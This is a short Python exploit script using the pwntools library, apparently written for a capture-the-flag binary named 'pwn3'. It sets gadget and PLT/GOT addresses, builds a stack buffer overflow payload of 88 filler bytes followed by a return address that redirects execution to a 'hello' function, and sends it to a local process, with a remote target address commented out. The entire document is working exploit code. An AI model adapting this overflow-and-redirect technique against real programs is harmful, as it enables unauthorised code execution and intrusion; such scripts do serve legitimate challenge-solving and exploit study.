from pwn import *



puts_plt=0x00000000004005d0
fgets_got=0x0000000000601020
pop_rdi=0x0000000000400883
hello=0x400767

pop_rsi=0x0000000000400881
p=process("./pwn3")
#p=remote("34.251.66.45",13373)
payload=""
payload+="A"*88
payload+=p64(hello)
pause()

p.sendline(payload)
p.interactive()